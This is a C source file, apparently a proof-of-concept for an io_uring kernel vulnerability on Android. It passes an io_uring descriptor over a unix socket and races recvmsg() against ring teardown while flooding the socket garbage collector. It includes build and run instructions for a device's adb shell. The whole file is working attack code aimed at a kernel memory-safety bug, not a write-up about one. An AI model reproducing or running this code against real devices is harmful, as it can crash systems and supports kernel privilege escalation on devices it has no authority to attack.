/*
 * CVE-2023-52654 PoC sketch: io_uring fd passed over an AF_UNIX socket while
 * the ring has a registered socket, racing recvmsg() against ring teardown.
 *
 * Build: clang --target=aarch64-linux-android21 -fPIE -pie -O2 -pthread uring_cve.c -o uring_cve
 * Run as adb shell (uid 2000): no seccomp block on io_uring_setup.
 *
 * Usage: ./uring_cve [iterations] [threads]
 */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <unistd.h>

#define IORING_REGISTER_FILES 1
#define IORING_UNREGISTER_FILES 2

static atomic_int g_iters;
static atomic_int g_fail;

static int uring_setup(unsigned entries) {
    unsigned char params[256];
    memset(params, 0, sizeof params);
    return (int)syscall(425, entries, params);
}

static int uring_register(int ring, unsigned opcode, void *arg, unsigned nr) {
    return (int)syscall(427, ring, opcode, arg, nr);
}

static int send_fd(int sock, int fd) {
    char c = 'x';
    struct iovec iov = {&c, 1};
    char cbuf[CMSG_SPACE(sizeof(int))];
    memset(cbuf, 0, sizeof cbuf);
    struct msghdr msg;
    memset(&msg, 0, sizeof msg);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof cbuf;
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_SOCKET;
    cm->cmsg_type = SCM_RIGHTS;
    cm->cmsg_len = CMSG_LEN(sizeof(int));
    memcpy(CMSG_DATA(cm), &fd, sizeof(int));
    return (int)sendmsg(sock, &msg, MSG_NOSIGNAL);
}

static int recv_fd(int sock, int *out) {
    char c;
    struct iovec iov = {&c, 1};
    char cbuf[CMSG_SPACE(sizeof(int))];
    memset(cbuf, 0, sizeof cbuf);
    struct msghdr msg;
    memset(&msg, 0, sizeof msg);
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    msg.msg_control = cbuf;
    msg.msg_controllen = sizeof cbuf;
    ssize_t n = recvmsg(sock, &msg, 0);
    if (n <= 0) return -1;
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    if (!cm || cm->cmsg_type != SCM_RIGHTS) return -1;
    memcpy(out, CMSG_DATA(cm), sizeof(int));
    return 0;
}

struct pair {
    int sv[2];
    int ring;
};

static void *reader_thread(void *arg) {
    struct pair *p = arg;
    int got = -1;
    if (recv_fd(p->sv[1], &got) == 0 && got >= 0) {
        close(got);
    }
    return NULL;
}

static void *closer_thread(void *arg) {
    struct pair *p = arg;
    close(p->ring);
    close(p->sv[0]);
    return NULL;
}

/* Constant unix-socket churn to keep the GC busy. */
static void *gc_pressure(void *arg) {
    (void)arg;
    while (!atomic_load(&g_iters)) {
        int a[2];
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, a) == 0) {
            int r = uring_setup(4);
            if (r >= 0) {
                int reg[1] = {a[0]};
                uring_register(r, IORING_REGISTER_FILES, reg, 1);
                send_fd(a[0], r);
                close(a[0]);
                close(a[1]);
                close(r);
            } else {
                close(a[0]);
                close(a[1]);
            }
        }
    }
    return NULL;
}

int main(int argc, char **argv) {
    int iters = argc > 1 ? atoi(argv[1]) : 100;
    int nthr = argc > 2 ? atoi(argv[2]) : 2;
    printf("uring_cve: iters=%d threads=%d pid=%d\n", iters, nthr, (int)getpid());

    pthread_t gp;
    pthread_create(&gp, NULL, gc_pressure, NULL);

    for (int i = 0; i < iters; i++) {
        struct pair p;
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, p.sv) != 0) { atomic_fetch_add(&g_fail, 1); continue; }
        p.ring = uring_setup(8);
        if (p.ring < 0) { close(p.sv[0]); close(p.sv[1]); continue; }

        int reg[1] = {p.sv[0]};
        uring_register(p.ring, IORING_REGISTER_FILES, reg, 1);
        if (send_fd(p.sv[0], p.ring) < 0) { /* still exercise teardown */ }

        pthread_t t1, t2;
        pthread_create(&t1, NULL, reader_thread, &p);
        pthread_create(&t2, NULL, closer_thread, &p);
        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        close(p.sv[1]);
        if ((i + 1) % 25 == 0) printf("  iter %d\n", i + 1);
    }
    atomic_store(&g_iters, 1);
    pthread_join(gp, NULL);
    printf("done: iters=%d failures=%d\n", iters, atomic_load(&g_fail));
    return 0;
}
